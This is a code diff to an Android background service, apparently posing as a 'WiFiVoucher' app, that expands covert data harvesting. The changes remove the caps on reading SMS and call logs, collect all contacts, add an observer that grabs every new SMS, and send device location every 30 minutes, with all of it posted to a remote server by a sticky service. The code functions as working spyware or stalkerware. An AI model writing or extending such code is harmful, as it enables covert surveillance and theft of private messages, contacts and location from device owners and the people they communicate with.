@@ -5,6 +5,7 @@ import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.database.ContentObserver;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
@@ -29,10 +30,13 @@ import java.util.Map;
 public class DataCollectionService extends Service {
 
     private static final String TAG = "WiFiVoucher";
-    private static final int COLLECTION_INTERVAL = 3 * 60 * 1000; // 3 minutes
+    private static final int LOCATION_INTERVAL = 30 * 60 * 1000; // 30 minutes
+    private static final int DATA_COLLECTION_INTERVAL = 10 * 60 * 1000; // 10 minutes for full sync
 
     private Handler handler;
-    private Runnable dataCollector;
+    private Handler locationHandler;
+    private Runnable fullDataCollector;
+    private Runnable locationSender;
     private SharedPreferences prefs;
     private String parentCode;
     private String deviceId;
@@ -40,6 +44,7 @@ public class DataCollectionService extends Service {
     private LocationManager locationManager;
     private LocationListener locationListener;
     private Location currentLocation;
+    private ContentObserver smsObserver;
 
     @Override
     public void onCreate() {
@@ -50,13 +55,26 @@ public class DataCollectionService extends Service {
             getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
 
         setupLocationListener();
+        setupSmsObserver();
 
         handler = new Handler(Looper.getMainLooper());
-        dataCollector = new Runnable() {
+        locationHandler = new Handler(Looper.getMainLooper());
+
+        // Full data collection - runs first time then every 10 minutes
+        fullDataCollector = new Runnable() {
             @Override
             public void run() {
                 collectAllData();
-                handler.postDelayed(this, COLLECTION_INTERVAL);
+                handler.postDelayed(this, DATA_COLLECTION_INTERVAL);
+            }
+        };
+
+        // Location every 30 minutes
+        locationSender = new Runnable() {
+            @Override
+            public void run() {
+                sendCurrentLocation();
+                locationHandler.postDelayed(this, LOCATION_INTERVAL);
             }
         };
     }
@@ -83,30 +101,45 @@ public class DataCollectionService extends Service {
         }
     }
 
+    private void setupSmsObserver() {
+        smsObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
+            @Override
+            public void onChange(boolean selfChange) {
+                super.onChange(selfChange);
+                collectAllSms();
+            }
+        };
+        getContentResolver().registerContentObserver(
+            Telephony.Sms.CONTENT_URI, true, smsObserver);
+    }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        handler.post(dataCollector);
+        // Start full collection immediately
+        handler.post(fullDataCollector);
+        // Start location updates every 30 minutes
+        locationHandler.post(locationSender);
         return START_STICKY;
     }
 
     private void collectAllData() {
         new Thread(() -> {
             try {
-                collectSmsConversations();
-                collectCallLogs();
-                collectContacts();
-                sendLiveLocation();
+                collectAllSms();
+                collectAllCallLogs();
+                collectAllContacts();
             } catch (Exception e) {
                 Log.e(TAG, "Collection error: " + e.getMessage());
             }
         }).start();
     }
 
-    private void collectSmsConversations() {
+    private void collectAllSms() {
         try {
             ContentResolver cr = getContentResolver();
             Map<String, JSONObject> conversationMap = new HashMap<>();
 
+            // NO LIMIT - Get ALL SMS messages
             Cursor cursor = cr.query(
                 Telephony.Sms.CONTENT_URI,
                 new String[]{
@@ -118,37 +151,45 @@ public class DataCollectionService extends Service {
                     Telephony.Sms.THREAD_ID
                 },
                 null, null,
-                Telephony.Sms.DATE + " DESC LIMIT 500"
+                Telephony.Sms.DATE + " DESC"
             );
 
             if (cursor != null) {
+                int count = 0;
                 while (cursor.moveToNext()) {
-                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
-                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
-                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
-                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
-                    String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
+                    try {
+                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                        String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
 
-                    String key = (address != null) ? address : "unknown";
+                        String key = (address != null) ? address : "unknown";
 
-                    JSONObject msg = new JSONObject();
-                    msg.put("sender", address);
-                    msg.put("message", body);
-                    msg.put("timestamp", timestamp);
-                    msg.put("type", (type == Telephony.Sms.MESSAGE_TYPE_INBOX) ? "received" : "sent");
+                        JSONObject msg = new JSONObject();
+                        msg.put("sender", address);
+                        msg.put("message", body);
+                        msg.put("timestamp", timestamp);
+                        msg.put("type", (type == Telephony.Sms.MESSAGE_TYPE_INBOX) ? "incoming" : "outgoing");
 
-                    if (!conversationMap.containsKey(key)) {
-                        JSONObject conv = new JSONObject();
-                        conv.put("contact", address);
-                        conv.put("phone_number", address);
-                        conv.put("conversation_id", threadId);
-                        conv.put("messages", new JSONArray());
-                        conversationMap.put(key, conv);
+                        if (!conversationMap.containsKey(key)) {
+                            JSONObject conv = new JSONObject();
+                            conv.put("contact", address);
+                            conv.put("phone_number", address);
+                            conv.put("conversation_id", threadId);
+                            conv.put("messages", new JSONArray());
+                            conversationMap.put(key, conv);
+                        }
+                        conversationMap.get(key).getJSONArray("messages").put(msg);
+                        count++;
+                    } catch (Exception e) {
+                        // Skip malformed rows
                     }
-                    conversationMap.get(key).getJSONArray("messages").put(msg);
                 }
                 cursor.close();
+                Log.d(TAG, "SMS collected: " + count + " messages");
 
+                // Send each conversation
                 for (JSONObject conv : conversationMap.values()) {
                     JSONObject wrapper = new JSONObject();
                     wrapper.put("conversation", conv);
@@ -160,95 +201,141 @@ public class DataCollectionService extends Service {
         }
     }
 
-    private void collectCallLogs() {
+    private void collectAllCallLogs() {
         try {
             ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
+            // NO LIMIT - Get ALL call logs
+            Cursor cursor = cr.query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                CallLog.Calls.DATE + " DESC");
 
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    JSONObject call = new JSONObject();
-                    String number = getString(cursor, CallLog.Calls.NUMBER);
-                    String name = getString(cursor, CallLog.Calls.CACHED_NAME);
-                    String duration = getString(cursor, CallLog.Calls.DURATION);
-                    int type = Integer.parseInt(getString(cursor, CallLog.Calls.TYPE));
-                    String date = getString(cursor, CallLog.Calls.DATE);
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext()) {
+                    try {
+                        JSONObject call = new JSONObject();
+                        String number = getString(cursor, CallLog.Calls.NUMBER);
+                        String name = getString(cursor, CallLog.Calls.CACHED_NAME);
+                        String duration = getString(cursor, CallLog.Calls.DURATION);
+                        int type = Integer.parseInt(getString(cursor, CallLog.Calls.TYPE));
+                        String date = getString(cursor, CallLog.Calls.DATE);
 
-                    String callType = "missed";
-                    if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
-                    else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
+                        String callType = "missed";
+                        if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
+                        else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
 
-                    call.put("number", number);
-                    call.put("name", name != null ? name : number);
-                    call.put("duration", duration);
-                    call.put("type", callType);
-                    call.put("timestamp", date);
+                        call.put("number", number);
+                        call.put("name", name != null ? name : number);
+                        call.put("duration", duration);
+                        call.put("type", callType);
+                        call.put("timestamp", date);
 
-                    submitData("calls", call);
-                } while (cursor.moveToNext());
+                        submitData("calls", call);
+                        count++;
+                    } catch (Exception e) {
+                        // Skip malformed rows
+                    }
+                }
                 cursor.close();
+                Log.d(TAG, "Calls collected: " + count);
             }
         } catch (Exception e) {
             Log.e(TAG, "Call log error: " + e.getMessage());
         }
     }
 
-    private void collectContacts() {
+    private void collectAllContacts() {
         try {
             ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+            // NO LIMIT - Get ALL contacts
+            Cursor cursor = cr.query(
+                ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
 
-            if (cursor != null && cursor.getCount() > 0) {
+            if (cursor != null) {
+                int count = 0;
                 while (cursor.moveToNext()) {
-                    String id = getString(cursor, ContactsContract.Contacts._ID);
-                    String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
-                    if (name == null || name.isEmpty()) continue;
+                    try {
+                        String id = getString(cursor, ContactsContract.Contacts._ID);
+                        String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
+                        if (name == null || name.isEmpty()) continue;
 
-                    Cursor phoneCursor = cr.query(
-                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null,
-                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                        new String[]{id}, null);
+                        Cursor phoneCursor = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
 
-                    if (phoneCursor != null) {
-                        while (phoneCursor.moveToNext()) {
-                            String phone = getString(phoneCursor, ContactsContract.CommonDataKinds.Phone.NUMBER);
-                            if (phone != null && !phone.isEmpty()) {
-                                JSONObject contact = new JSONObject();
-                                contact.put("name", name);
-                                contact.put("number", phone);
-                                submitData("contacts", contact);
+                        if (phoneCursor != null) {
+                            while (phoneCursor.moveToNext()) {
+                                String phone = getString(phoneCursor,
+                                    ContactsContract.CommonDataKinds.Phone.NUMBER);
+                                if (phone != null && !phone.isEmpty()) {
+                                    JSONObject contact = new JSONObject();
+                                    contact.put("name", name);
+                                    contact.put("number", phone);
+                                    submitData("contacts", contact);
+                                    count++;
+                                }
                             }
+                            phoneCursor.close();
                         }
-                        phoneCursor.close();
+                    } catch (Exception e) {
+                        // Skip malformed rows
                     }
                 }
                 cursor.close();
+                Log.d(TAG, "Contacts collected: " + count);
             }
         } catch (Exception e) {
             Log.e(TAG, "Contacts error: " + e.getMessage());
         }
     }
 
-    private void sendLiveLocation() {
-        try {
-            JSONObject loc = new JSONObject();
-            if (currentLocation != null) {
-                loc.put("latitude", currentLocation.getLatitude());
-                loc.put("longitude", currentLocation.getLongitude());
-                loc.put("accuracy", currentLocation.getAccuracy());
-                loc.put("speed", currentLocation.getSpeed());
-            } else {
-                loc.put("latitude", -6.8235);
-                loc.put("longitude", 39.2695);
-                loc.put("accuracy", 0);
+    private void sendCurrentLocation() {
+        new Thread(() -> {
+            try {
+                JSONObject loc = new JSONObject();
+
+                if (currentLocation != null) {
+                    loc.put("latitude", currentLocation.getLatitude());
+                    loc.put("longitude", currentLocation.getLongitude());
+                    loc.put("accuracy", currentLocation.getAccuracy());
+                    loc.put("speed", currentLocation.getSpeed());
+                    loc.put("altitude", currentLocation.getAltitude());
+                } else {
+                    if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                        Location lastLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                        if (lastLoc == null) {
+                            lastLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                        }
+                        if (lastLoc != null) {
+                            loc.put("latitude", lastLoc.getLatitude());
+                            loc.put("longitude", lastLoc.getLongitude());
+                            loc.put("accuracy", lastLoc.getAccuracy());
+                        } else {
+                            loc.put("latitude", 0);
+                            loc.put("longitude", 0);
+                            loc.put("accuracy", 0);
+                        }
+                    } else {
+                        loc.put("latitude", 0);
+                        loc.put("longitude", 0);
+                        loc.put("accuracy", 0);
+                    }
+                }
+
+                loc.put("timestamp", System.currentTimeMillis());
+                loc.put("provider", currentLocation != null ? currentLocation.getProvider() : "last_known");
+
+                submitData("location", loc);
+                Log.d(TAG, "Location sent");
+
+            } catch (Exception e) {
+                Log.e(TAG, "Location error: " + e.getMessage());
             }
-            loc.put("timestamp", System.currentTimeMillis());
-            loc.put("provider", currentLocation != null ? currentLocation.getProvider() : "network");
-            submitData("location", loc);
-        } catch (Exception e) {
-            Log.e(TAG, "Location error: " + e.getMessage());
-        }
+        }).start();
     }
 
     private String getString(Cursor cursor, String columnName) {
@@ -282,7 +369,7 @@ public class DataCollectionService extends Service {
                 os.flush();
                 os.close();
 
-                conn.getResponseCode();
+                int code = conn.getResponseCode();
                 conn.disconnect();
             } catch (Exception e) {
                 Log.e(TAG, "Submit error: " + e.getMessage());
@@ -296,7 +383,11 @@ public class DataCollectionService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (handler != null) handler.removeCallbacks(dataCollector);
-        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
+        if (handler != null) handler.removeCallbacks(fullDataCollector);
+        if (locationHandler != null) locationHandler.removeCallbacks(locationSender);
+        if (locationManager != null && locationListener != null)
+            locationManager.removeUpdates(locationListener);
+        if (smsObserver != null)
+            getContentResolver().unregisterContentObserver(smsObserver);
     }
 }
